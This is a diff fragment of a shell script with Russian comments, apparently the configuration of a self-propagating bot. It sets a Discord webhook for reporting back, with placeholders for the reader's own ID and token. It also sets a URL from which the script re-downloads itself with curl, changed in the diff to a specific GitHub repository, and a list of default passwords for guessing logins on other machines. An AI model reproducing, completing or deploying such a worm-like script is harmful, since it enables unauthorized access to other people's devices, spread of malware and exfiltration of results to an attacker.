@@ -8,7 +8,7 @@
 WEBHOOK="https://discord.com/api/webhooks/ТВОЙ_ID/ТВОЙ_ТОКЕН"
 
 # Ссылка на этот же скрипт (используем curl, он есть везде)
-BOT_URL="https://raw.githubusercontent.com/ТВОЙ_НИК/ТВОЙ_РЕПО/main/bot.sh"
+BOT_URL="https://github.com/traiantadgs-ops/exe/tree/main"
 
 # Пароли (добавь свои, если знаешь общие дефолтные)
 PASSWORDS="admin password root 123456 letmein default administrator"
